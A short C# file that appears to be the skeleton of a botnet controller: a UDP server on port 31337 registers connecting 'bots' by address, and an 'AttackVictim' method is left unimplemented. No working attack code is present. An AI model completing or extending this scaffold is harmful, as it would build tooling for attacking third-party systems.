using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace Shob
{
    class UDPShob
    {
        Controller controller;
        string ShobName = "Krang";
        int ShobPort = 31337;
        Dictionary<IPAddress, int> MyBots;
        public UDPShob()
        {
            MyBots = new Dictionary<IPAddress, int>();
        }
        internal void SetController(Controller mcontroller)
        {
            controller = mcontroller;
        }

        internal void StartServer()
        {
            
                UdpClient udpServer = new UdpClient(ShobPort);
                var remoteEP = new IPEndPoint(IPAddress.Any, ShobPort);
                var data = udpServer.Receive(ref remoteEP);
                int i = data[0] + (data[1] * 256);
                MyBots.Add(remoteEP.Address, i);
            
        }

        internal void AttackVictim(IPAddress iPAddress, int port, string text)
        {
            throw new NotImplementedException();
        }
    }
}
